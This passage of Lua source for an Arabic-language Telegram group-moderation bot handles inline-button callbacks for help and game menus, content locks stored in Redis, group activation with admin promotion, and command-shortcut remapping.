• مرحبا بك في الالعاب المتطورة الخاص ب𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈.
• اختر اللعبه ثم اختار المحادثة التي تريد اللعب بها
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/normgm') then
local UserId = Text:match('(%d+)/normgm')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, },}}
local TextHelp = [[*
• قائمه الالعاب البوت
ٴ— — — — — — — — — —
• لعبة المختلف » المختلف
• لعبة الامثله » امثله
• لعبة العكس » العكس
• لعبة الحزوره » حزوره
• لعبة المعاني » معاني
• لعبة الترجمه » انجليزي
• لعبة البات » بات
• لعبة التخمين » خمن
• لعبة الاسرع » الاسرع
• لعبة السمايلات » سمايلات
• لعبة الاسئلة » كت تويت
• لعبة الاعلام والدول » اعلام
• لعبة لو خيروك » خيروك
• لعبة الصراحه والجرأة » صراحه
• لعبة التعرف  علي المشاهير » شخصيات
ٴ— — — — — — — — — —
• نقاطي ← لعرض عدد الارباح
• بيع نقاطي ← { العدد } ← لبيع كل نقطه مقابل {50} رساله
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/helpall') then
local UserId = Text:match('(%d+)/helpall')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '٬ ⁰ ٫', data = IdUser..'/help1'}, {text = '٬ ¹ ٫', data = IdUser..'/help2'}, },
{{text = '٬ ² ٫', data = IdUser..'/help3'}, {text = '٬ ³ ٫', data = IdUser..'/help4'}, },
{{text = '٬ ⁴ ٫', data = IdUser..'/help5'}, {text = '٬ ⁵ ٫', data = IdUser..'/help7'}, },
{{text = '٬ ⁶ ٫', data = IdUser..'/help6'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'},},}}
local TextHelp = [[*
• 𝖤𝗑𝖲𝗌𝗍 ← 6 𝗈𝗋𝖣𝖾𝗋𝖲 𝗂𝖭 𝗍𝗁𝖤 𝖻𝖮𝗍
━─━─━─━─━
• 𝖲𝖾𝖭𝖽 { م0 } ←- 𝖢𝗅𝖾𝖺𝖭𝖾𝗋𝗌 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م1 } ←- 𝖯𝗋𝗈𝖳𝖾𝖼𝖳𝗂𝗈𝗇 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م2 } ←- 𝖮𝗋𝖽𝖾𝗋𝗌 𝗈𝖥 𝗍𝗁𝖾 𝖺𝖣𝗆𝗂𝖭𝗌 .
• 𝖲𝖾𝖭𝖽 { م3 } ←- 𝖬𝖺𝗇𝖠𝗀𝖾𝗋𝗌 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م4 } ←- 𝖢𝗈𝗇𝖲𝗍𝗋𝖴𝖼𝗍𝗈𝗋𝗌 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م5 } ←- 𝖣𝖾𝖵𝖾𝗅𝗈𝖯𝖾𝗋 𝖮𝗋𝖽𝖾𝗋𝗌 .
• 𝖲𝖾𝖭𝖽 { م6 } ←- E𝗇T𝖾R𝗍𝖺iN𝗆E𝗇𝗍 𝖮𝗋𝖽𝖾𝗋𝗌
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)toar') then
local UserId = Text:match('(%d+)toar')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'قناة السورس', url = 'https://t.me/LaRiCaTeam'}, },}}
local TextHelp = [[*• حسنا ارسل النص لترجمته الي العربيه*]]
Redis:set(LaRiCa.."toar"..IdUser,"on")
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)toen') then
local UserId = Text:match('(%d+)toen')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'قناة السورس', url = 'https://t.me/LaRiCaTeam'}, },}}
local TextHelp = [[*• حسنا ارسل النص لترجمته الي الانجليزيه*]]
Redis:set(LaRiCa.."toen"..IdUser,"on")
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/lock_link') then
local UserId = Text:match('(%d+)/lock_link')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Link"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الروابط").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_spam') then
local UserId = Text:match('(%d+)/lock_spam')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Spam"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الكلايش").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_keypord') then
local UserId = Text:match('(%d+)/lock_keypord')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Keyboard"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الكيبورد").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_voice') then
local UserId = Text:match('(%d+)/lock_voice')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:vico"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الاغاني").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gif') then
local UserId = Text:match('(%d+)/lock_gif')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Animation"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل المتحركات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_files') then
local UserId = Text:match('(%d+)/lock_files')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Document"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الملفات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_text') then
local UserId = Text:match('(%d+)/lock_text')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:text"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الدردشه").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_video') then
local UserId = Text:match('(%d+)/lock_video')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Video"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الفيديو").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_photo') then
local UserId = Text:match('(%d+)/lock_photo')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Photo"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الصور").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_username') then
local UserId = Text:match('(%d+)/lock_username')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:User:Name"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل المعرفات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tags') then
local UserId = Text:match('(%d+)/lock_tags')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:hashtak"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التاك").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_bots') then
local UserId = Text:match('(%d+)/lock_bots')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Bot:kick"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل البوتات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fwd') then
local UserId = Text:match('(%d+)/lock_fwd')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:forward"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التوجيه").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_audio') then
local UserId = Text:match('(%d+)/lock_audio')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Audio"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الصوت").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_stikear') then
local UserId = Text:match('(%d+)/lock_stikear')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Sticker"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الملصقات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_phone') then
local UserId = Text:match('(%d+)/lock_phone')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Contact"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الجهات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_joine') then
local UserId = Text:match('(%d+)/lock_joine')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Join"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الدفرخ").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_addmem') then
local UserId = Text:match('(%d+)/lock_addmem')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:AddMempar"..ChatId,"kick")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الاضافه").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videonote') then
local UserId = Text:match('(%d+)/lock_videonote')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Unsupported"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل بصمه الفيديو").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_pin') then
local UserId = Text:match('(%d+)/lock_pin')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."lockpin"..ChatId,(LuaTele.getChatPinnedMessage(ChatId).id or true)) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التثبيت").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tgservir') then
local UserId = Text:match('(%d+)/lock_tgservir')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:tagservr"..ChatId,true)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الاشعارات").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_markdaun') then
local UserId = Text:match('(%d+)/lock_markdaun')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Markdaun"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الماركدون").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_edits') then
local UserId = Text:match('(%d+)/lock_edits')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:edit"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التعديل").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_games') then
local UserId = Text:match('(%d+)/lock_games')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:geam"..ChatId,"del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الالعاب").Lock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_flood') then
local UserId = Text:match('(%d+)/lock_flood')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hset(LaRiCa.."Spam:Group:User"..ChatId ,"Spam:User","del")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التكرار").Lock, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/onlinebott(.*)') then
local UserId = {Text:match('(%d+)/onlinebott(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:sadd(LaRiCa.."ChekBotAdd",UserId[2])
Redis:set(LaRiCa.."Status:Id"..UserId[2],true) ;Redis:del(LaRiCa.."Status:Reply"..UserId[2]) ;Redis:del(LaRiCa.."Status:ReplySudo"..UserId[2]) ;Redis:set(LaRiCa.."Status:BanId"..UserId[2],true) ;Redis:set(LaRiCa.."Status:SetId"..UserId[2],true) 
local Info_Members = LuaTele.getSupergroupMembers(UserId[2], "Administrators", "*", 0, 200)
local List_Members = Info_Members.members
x = 0
y = 0
for k, v in pairs(List_Members) do
if Info_Members.members[k].bot_info == nil then
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
Redis:sadd(LaRiCa.."Owners:Group"..UserId[2],v.member_id.user_id) 
x = x + 1
else
Redis:sadd(LaRiCa.."Admin:Group"..UserId[2],v.member_id.user_id) 
y = y + 1
end
end
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• ترتيب الاوامر •', callback_data = IdUser..'/arrayCmd'..ChatId},
},
{
{text = '• 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. •', url="t.me/LaRiCaTeam"},
},
}
local txxt = "• تم تفعيل المجموعة و ترقيه {"..y.."} ادمنيه \n• تم ترقية المالك"

local mm = Msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/EditMessagecaption?chat_id='..ChatId..'&message_id='..mm..'&caption=' .. URL.escape(txxt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if Text and Text:match('(%d+)/arrayCmd(.*)') then
local UserId = {Text:match('(%d+)/arrayCmd(.*)')}
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'تعط','تعطيل الايدي بالصوره')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"تعط")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'تفع','تفعيل الايدي بالصوره')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"تفع")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'ا','ايدي')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"ا")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'م','رفع مميز')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"م")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'اد', 'رفع ادمن')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"اد")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'مد','رفع مدير')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"مد")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'من', 'رفع منشئ')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"من")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'اس', 'رفع منشئ اساسي')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"اس")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'مط','رفع مطور')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"مط")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'ثانوي','رفع مطور ثانوي')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"ثانوي")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'تك','تنزيل الكل')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"تك")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'ر','الرابط')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"ر")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'رر','ردود المدير')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"رر")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'مسح المكتومين','ممكتومين')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"ممكتومين")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'رد','اضف رد')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"رد")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'سح','مسح سحكاتي')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"سح")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'رس','مسح رسائلي')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"رس")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'غ','غنيلي')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"غ")
Redis:set(LaRiCa.."Get:Reides:Commands:Group"..ChatId..":"..'#','مسح قائمه العام')
Redis:sadd(LaRiCa.."Command:List:Group"..ChatId,"#")
local txxt = [[
• تم ترتيب الاوامر بالشكل التالي ~
•  ايدي - ا .
•  رفع مميز - م .
• رفع ادمن - اد .
•  رفع مدير - مد .
•  رفع منشى - من .
•  رفع منشئ الاساسي - اس  .
•  رفع مطور - مط .
• رفع مطور ثانوي - ثانوي .
•  تنزيل الكل - تك .
•  تعطيل الايدي بالصوره - تعط .
•  تفعيل الايدي بالصوره - تفع .
•  الرابط - ر .
•  ردود المدير - رر .
•  مسح المكتومين - ،، .
•  اضف رد - رد .
•  مسح سحكاتي - سح .
•  مسح رسائلي - رس .
•  غنيلي - غ .
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '• 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. •', url="t.me/LaRiCaTeam"},
},
}
local mm = Msg_id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token..'/EditMessagecaption?chat_id='..ChatId..'&message_id='..mm..'&caption=' .. URL.escape(txxt).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if Text and Text:match('(%d+)/zog1') then
local UserId = Text:match('(%d+)/zog1')
if tonumber(IdUser) == tonumber(UserId) then
local bain = LuaTele.getUser(IdUser)
if bain.first_name then
LaRiCausername = '*تم الزواج بنجاح \nمبروك  يا  : *['..bain.first_name..'](tg://user?id='..bain.id..' *\n*'
else
LaRiCausername = 'لا يوجد'
end
LuaTele.editMessageText(ChatId,Msg_id,LaRiCausername, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/zog2') then
local UserId = Text:match('(%d+)/zog2')
if tonumber(IdUser) == tonumber(UserId) then
LuaTele.editMessageText(ChatId,Msg_id,"*• تم رفض الزواج من الزوجه*","md",true) 
end
end
if Text and Text:match('(%d+)/lock_linkkid') then
local UserId = Text:match('(%d+)/lock_linkkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Link"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الروابط").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_spamkid') then
local UserId = Text:match('(%d+)/lock_spamkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Spam"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الكلايش").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_keypordkid') then
local UserId = Text:match('(%d+)/lock_keypordkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Keyboard"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الكيبورد").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_voicekid') then
local UserId = Text:match('(%d+)/lock_voicekid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:vico"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الاغاني").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_gifkid') then
local UserId = Text:match('(%d+)/lock_gifkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Animation"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل المتحركات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fileskid') then
local UserId = Text:match('(%d+)/lock_fileskid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Document"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الملفات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_videokid') then
local UserId = Text:match('(%d+)/lock_videokid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Video"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الفيديو").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_photokid') then
local UserId = Text:match('(%d+)/lock_photokid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Photo"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الصور").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_usernamekid') then
local UserId = Text:match('(%d+)/lock_usernamekid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:User:Name"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل المعرفات").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_tagskid') then
local UserId = Text:match('(%d+)/lock_tagskid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:hashtak"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التاك").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_fwdkid') then
local UserId = Text:match('(%d+)/lock_fwdkid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:forward"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل التوجيه").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_audiokid') then
local UserId = Text:match('(%d+)/lock_audiokid')
if tonumber(IdUser) == tonumber(UserId) then
Redis:set(LaRiCa.."Lock:Audio"..ChatId,"ked")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم قفـل الصوت").lockKid, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/lock_stikearkid') then
